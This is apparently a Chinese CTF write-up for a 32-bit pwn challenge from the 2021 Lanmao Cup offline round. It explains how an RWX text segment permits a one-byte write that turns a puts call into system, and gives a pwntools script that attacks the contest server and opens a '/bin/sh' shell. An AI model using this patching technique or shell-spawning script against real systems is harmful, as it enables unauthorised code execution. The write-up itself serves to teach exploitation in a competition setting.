---
title: 蓝帽杯2021线下Pwn题WP
author: Ch4rc0al
date: 2021-07-02T18:52:03+08:00
#cover: /img/cover.jpg
categories:
  - WriteUps
tags:
  - Pwn 
  - CTF
# nolastmod: true
---

<!--more-->

## cover

>     Arch:     i386-32-little
>     RELRO:    Partial RELRO
>     Stack:    Canary found
>     NX:       NX enabled
>     PIE:      No PIE (0x8048000)



线下唯一做出来的题

> mprotect(&dword_8048000, 0x8888u, 7);

开头将源程序的0x8048000+0x8888的部分的权限改为了**可读可写可执行**

main 函数内容

```c
buf_1 = 0;
buf_2 = 0;
printf("Try use a bullet to pwn this%s\n", (const char *)&buf_1);
read(0, &buf_1, 5u);
if ( (int)buf_1 > (int)"ou launch the bullet, and... What's your name?%c\n" )
{
  printf("%p is too big...\n", buf_1);
  exit(0);
}
*buf_1 = buf_2;
printf("OK,you launch the bullet, and... What's your name?%c\n", SHIBYTE(v5));
read(0, &buf_1, 0xAu);
puts((const char *)&buf_1);
```

其中`(int)"ou launch the bullet, and... What's your name?%c\n"`的地址为0x8048888，程序会在buf_1输入一个地址，并且将buf_2的内容写入到buf_1地址对应的内存中。

由于是32位程序，我们可以溢出buf_1使buf_2的内容被修改。

由于0x8048000-0x8048888之间的内容包括`text`段，所以我们可以修改程序的`text`段来达到修改程序执行流的效果，我们可以将调用`puts`的内容改为调用`system`来运行`system("/bin/sh")`

```python
from pwn import *
context(os='linux',arch='i386',log_level='debug')
sh=remote('118.190.62.234',12435)
#sh=process('./pwn')
#08040000-08048888
p1=p32(0x08048792)
print p1
sh.sendafter('Try use a bullet to pwn this\n',p1+p8(0x4a))
sh.sendafter("OK,you launch the bullet, and... What's your name?",'/bin/sh')
sh.interactive()

```



